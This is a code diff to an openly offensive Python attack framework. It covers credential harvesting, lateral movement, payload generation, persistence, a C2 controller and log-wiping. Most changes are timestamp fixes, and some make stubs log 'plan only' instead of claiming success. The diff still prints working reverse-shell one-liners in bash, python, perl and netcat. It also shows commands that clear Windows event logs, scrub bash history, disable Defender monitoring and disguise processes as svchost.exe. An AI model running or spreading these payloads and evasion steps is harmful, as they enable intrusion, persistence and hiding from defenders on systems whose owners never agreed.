@@ -30,7 +30,7 @@ import zlib
 from abc import ABC, abstractmethod
 from cryptography.fernet import Fernet
 from dataclasses import dataclass, field, asdict
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, timezone
 from enum import Enum
 from pathlib import Path
 from typing import Any, Callable, Dict, List, Optional, Set, Tuple
@@ -104,12 +104,12 @@ class Credential:
     access_level: AccessLevel = AccessLevel.USER
     valid: bool = True
     last_used: Optional[str] = None
-    discovered_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
+    discovered_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
     metadata: Dict[str, Any] = field(default_factory=dict)
 
     def mark_used(self) -> None:
         """Mark credential as recently used."""
-        self.last_used = datetime.utcnow().isoformat()
+        self.last_used = datetime.now(timezone.utc).isoformat()
 
     def to_dict(self) -> Dict[str, Any]:
         """Serialize to dict."""
@@ -125,8 +125,8 @@ class Shell:
     shell_type: str = ""  # cmd, powershell, bash, sh
     access_level: AccessLevel = AccessLevel.USER
     os_type: OSType = OSType.LINUX
-    established_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
-    last_seen: str = field(default_factory=lambda: datetime.utcnow().isoformat())
+    established_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
+    last_seen: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
     alive: bool = True
     process_id: Optional[int] = None
     working_directory: str = ""
@@ -151,7 +151,7 @@ class Payload:
     lport: int = 0  # listener port
     signature: str = ""
     evasion_techniques: List[str] = field(default_factory=list)
-    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
+    created_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
     metadata: Dict[str, Any] = field(default_factory=dict)
 
 
@@ -170,7 +170,7 @@ class AttackWorkflow:
     credentials_required: List[str] = field(default_factory=list)
     current_step: int = 0
     status: str = "planning"  # planning, executing, paused, completed, failed
-    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
+    created_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
     execution_log: List[Dict[str, Any]] = field(default_factory=list)
 
 
@@ -347,12 +347,12 @@ class CredentialVault:
         conn = sqlite3.connect(self.db_path)
         conn.execute(
             "UPDATE credentials SET last_used = ? WHERE id = ?",
-            (datetime.utcnow().isoformat(), credential_id)
+            (datetime.now(timezone.utc).isoformat(), credential_id)
         )
         conn.execute("""
             INSERT INTO credential_usage (id, credential_id, target, timestamp, success)
             VALUES (?, ?, ?, ?, ?)
-        """, (str(uuid4())[:8], credential_id, target, datetime.utcnow().isoformat(), int(success)))
+        """, (str(uuid4())[:8], credential_id, target, datetime.now(timezone.utc).isoformat(), int(success)))
         conn.commit()
         conn.close()
 
@@ -544,8 +544,9 @@ class LateralMovementEngine:
         else:
             cmd = f"arp -n | grep -oE '[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}'"
         
-        # Placeholder execution
-        self.logger.debug(f"Would execute: {cmd}")
+        # No remote shell channel: nothing was executed, so no hosts are
+        # reported. Command surfaced as a plan for the operator.
+        self.logger.warning(f"plan only (no shell channel, NOT executed): {cmd}")
         return hosts
 
     async def discover_services(self, host: str) -> Dict[str, Any]:
@@ -706,10 +707,19 @@ class PayloadGenerator:
 
     def _generate_linux_reverse_shell(self, lhost: str, lport: int, shell: str = "bash") -> bytes:
         """Linux reverse shell template."""
+        # Perl template is %-formatted outside the f-string: f-string
+        # replacement fields cannot contain statement lists (a;b) .
+        perl_one_liner = (
+            'perl -e \'use Socket;$i="%s";$p=%d;'
+            'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
+            'if(connect(S,sockaddr_in($p,inet_aton($i))))'
+            '{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
+            'exec("/bin/bash -i");}\'' % (lhost, lport)
+        )
         templates = {
             "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
             "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
-            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}'",
+            "perl": perl_one_liner,
             "nc": f"nc -e /bin/bash {lhost} {lport}",
         }
         return templates.get(shell, templates["bash"]).encode()
@@ -826,7 +836,7 @@ class PersistenceEngine:
             if success:
                 self.persistence_records[shell.id] = {
                     "method": method.value,
-                    "timestamp": datetime.utcnow().isoformat(),
+                    "timestamp": datetime.now(timezone.utc).isoformat(),
                     "payload_path": payload_path,
                 }
 
@@ -850,9 +860,11 @@ Register-ScheduledTask -TaskName 'WindowsUpdate' -Action $action -Trigger $trigg
         else:
             return False
 
-        # Placeholder execution
-        self.logger.debug(f"Would execute: {cmd}")
-        return True
+        # NOTE: no remote execution channel exists on this Shell record,
+        # so nothing is run and success is NOT claimed — the command is
+        # surfaced as a plan for the operator to run (or via C2).
+        self.logger.warning(f"plan only (no shell channel, NOT executed): {cmd}")
+        return False
 
     async def _install_linux(self, shell: Shell, payload_path: str, method: PersistenceMethod) -> bool:
         """Linux persistence installation."""
@@ -870,9 +882,11 @@ Register-ScheduledTask -TaskName 'WindowsUpdate' -Action $action -Trigger $trigg
         else:
             return False
 
-        # Placeholder execution
-        self.logger.debug(f"Would execute: {cmd}")
-        return True
+        # NOTE: no remote execution channel exists on this Shell record,
+        # so nothing is run and success is NOT claimed — the command is
+        # surfaced as a plan for the operator to run (or via C2).
+        self.logger.warning(f"plan only (no shell channel, NOT executed): {cmd}")
+        return False
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -893,8 +907,8 @@ class C2Controller:
         """Register callback agent."""
         self.agents[agent_id] = {
             "id": agent_id,
-            "registered_at": datetime.utcnow().isoformat(),
-            "last_seen": datetime.utcnow().isoformat(),
+            "registered_at": datetime.now(timezone.utc).isoformat(),
+            "last_seen": datetime.now(timezone.utc).isoformat(),
             "metadata": metadata,
             "commands": [],
         }
@@ -911,7 +925,7 @@ class C2Controller:
             "agent_id": agent_id,
             "command": command,
             "args": args,
-            "queued_at": datetime.utcnow().isoformat(),
+            "queued_at": datetime.now(timezone.utc).isoformat(),
         }
         
         await self.task_queue.put(task)
@@ -923,7 +937,7 @@ class C2Controller:
         if agent_id not in self.agents:
             return None
         
-        self.agents[agent_id]["last_seen"] = datetime.utcnow().isoformat()
+        self.agents[agent_id]["last_seen"] = datetime.now(timezone.utc).isoformat()
         
         try:
             task = self.task_queue.get_nowait()
@@ -958,16 +972,16 @@ class StealthEngine:
         """Windows event log cleanup."""
         # Remove entries from Event Viewer
         cmd = "wevtutil cl System"
-        self.logger.debug(f"Would execute: {cmd}")
-        return True
+        self.logger.warning(f"plan only (no shell channel, NOT executed): {cmd}")
+        return False
 
     async def _cleanup_linux_logs(self, shell: Shell, keywords: List[str]) -> bool:
         """Linux log cleanup."""
         for keyword in keywords:
             # Clean bash history
             cmd = f"sed -i '/{keyword}/d' ~/.bash_history"
-            self.logger.debug(f"Would execute: {cmd}")
-        return True
+            self.logger.warning(f"plan only (no shell channel, NOT executed): {cmd}")
+        return False
 
     async def disable_defender(self, shell: Shell) -> bool:
         """Disable antivirus/EDR if possible."""
@@ -975,8 +989,8 @@ class StealthEngine:
             return False
         
         cmd = "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\""
-        self.logger.debug(f"Would execute: {cmd}")
-        return True
+        self.logger.warning(f"plan only (no shell channel, NOT executed): {cmd}")
+        return False
 
     async def obfuscate_process(self, shell: Shell) -> bool:
         """Obfuscate running process."""
@@ -985,8 +999,8 @@ class StealthEngine:
         
         # Rename process to system process
         cmd = "powershell -Command \"Rename-Item -Path $PROFILE.CurrentUserCurrentHost -NewName 'svchost.exe'\""
-        self.logger.debug(f"Would execute: {cmd}")
-        return True
+        self.logger.warning(f"plan only (no shell channel, NOT executed): {cmd}")
+        return False
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1041,7 +1055,7 @@ class AttackOrchestrator:
             workflow.execution_log.append({
                 "step": 1,
                 "phase": "post_exploitation",
-                "timestamp": datetime.utcnow().isoformat(),
+                "timestamp": datetime.now(timezone.utc).isoformat(),
                 "result": "success",
                 "data": enum_data,
             })
@@ -1052,7 +1066,7 @@ class AttackOrchestrator:
             workflow.execution_log.append({
                 "step": 2,
                 "phase": "privilege_escalation",
-                "timestamp": datetime.utcnow().isoformat(),
+                "timestamp": datetime.now(timezone.utc).isoformat(),
                 "result": "success" if escalated else "failed",
             })
 
@@ -1062,7 +1076,7 @@ class AttackOrchestrator:
             workflow.execution_log.append({
                 "step": 3,
                 "phase": "credential_harvesting",
-                "timestamp": datetime.utcnow().isoformat(),
+                "timestamp": datetime.now(timezone.utc).isoformat(),
                 "result": "success",
                 "credentials_harvested": len(harvested_creds),
             })
@@ -1082,7 +1096,7 @@ class AttackOrchestrator:
             workflow.execution_log.append({
                 "step": 4,
                 "phase": "lateral_movement",
-                "timestamp": datetime.utcnow().isoformat(),
+                "timestamp": datetime.now(timezone.utc).isoformat(),
                 "result": "success",
                 "hosts_accessed": len(workflow.lateral_targets),
             })
@@ -1105,7 +1119,7 @@ class AttackOrchestrator:
             workflow.execution_log.append({
                 "step": 5,
                 "phase": "persistence",
-                "timestamp": datetime.utcnow().isoformat(),
+                "timestamp": datetime.now(timezone.utc).isoformat(),
                 "result": "success",
                 "persistence_methods": list(persistence_results.keys()),
             })
